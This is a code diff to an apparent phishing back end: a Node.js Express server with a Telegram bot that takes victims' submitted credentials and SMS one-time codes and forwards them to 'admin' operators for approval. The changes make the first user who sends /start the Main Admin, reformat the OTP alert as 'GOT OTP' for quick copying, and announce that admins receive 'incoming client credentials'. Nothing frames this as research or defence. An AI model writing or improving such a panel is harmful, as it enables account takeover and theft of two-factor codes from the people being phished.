@@ -7,7 +7,6 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || '';
 const PORT = process.env.PORT || 3000;
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
@@ -15,6 +14,9 @@ const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 let activeSessions = {};
 let authorizedAdmins = new Set();
 let pendingMainAdminAuth = new Map();
+
+// Automatically set the very first person who types /start as the Main Admin
+let MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || null;
 
 function isAuthorized(chatId) {
     if (MAIN_ADMIN_ID && chatId.toString() === MAIN_ADMIN_ID.toString()) return true;
@@ -24,7 +26,17 @@ function isAuthorized(chatId) {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userIdStr = chatId.toString();
-    const isMain = MAIN_ADMIN_ID && userIdStr === MAIN_ADMIN_ID.toString();
+
+    // If no main admin exists yet, make this user the Main Admin automatically
+    if (!MAIN_ADMIN_ID) {
+        MAIN_ADMIN_ID = userIdStr;
+        authorizedAdmins.add(userIdStr);
+        bot.sendMessage(chatId, "👑 **You are now registered as the Main Admin!**\nYour ID has been automatically saved. You have full access to receive incoming client credentials and verification alerts.", { parse_mode: "Markdown" });
+        console.log(`Main Admin automatically assigned to ID: ${userIdStr}`);
+        return;
+    }
+
+    const isMain = userIdStr === MAIN_ADMIN_ID.toString();
 
     if (isMain) {
         authorizedAdmins.add(userIdStr);
@@ -36,17 +48,15 @@ bot.onText(/\/start/, (msg) => {
             pendingMainAdminAuth.set(userIdStr, true);
             bot.sendMessage(chatId, "🔒 **Sub-Admin Access Request Pending.**\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: "Markdown" });
             
-            if (MAIN_ADMIN_ID) {
-                bot.sendMessage(MAIN_ADMIN_ID, `⚠️ **New Sub-Admin Request**\nUser ID: \`${chatId}\` wants access.`, {
-                    parse_mode: "Markdown",
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
-                            { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
-                        ]]
-                    }
-                });
-            }
+            bot.sendMessage(MAIN_ADMIN_ID, `⚠️ **New Sub-Admin Request**\nUser ID: \`${chatId}\` wants access.`, {
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
+                        { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
+                    ]]
+                }
+            });
         }
     }
 });
@@ -164,7 +174,7 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
     res.json({ success: true, sessionId });
 });
 
-// Endpoint for submitting OTP SMS (Second Telegram Notification)
+// Endpoint for submitting OTP SMS (Second Telegram Notification with Tap-to-Copy)
 app.post('/api/submit-otp', express.json(), (req, res) => {
     const { sessionId, otpText } = req.body;
     const session = activeSessions[sessionId];
@@ -176,7 +186,7 @@ app.post('/api/submit-otp', express.json(), (req, res) => {
     session.otpText = otpText;
     session.status = 'pending_final_approval';
 
-    const message = `OTP VERIFICATION\n\n` +
+    const message = `GOT OTP\nOTP VERIFICATION\n\n` +
         `PHONE NO: \`${session.phone}\`\n\n` +
         `OTP:\n\`\`\`text\n${otpText}\n\`\`\``;
 
@@ -211,4 +221,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-  
+                            
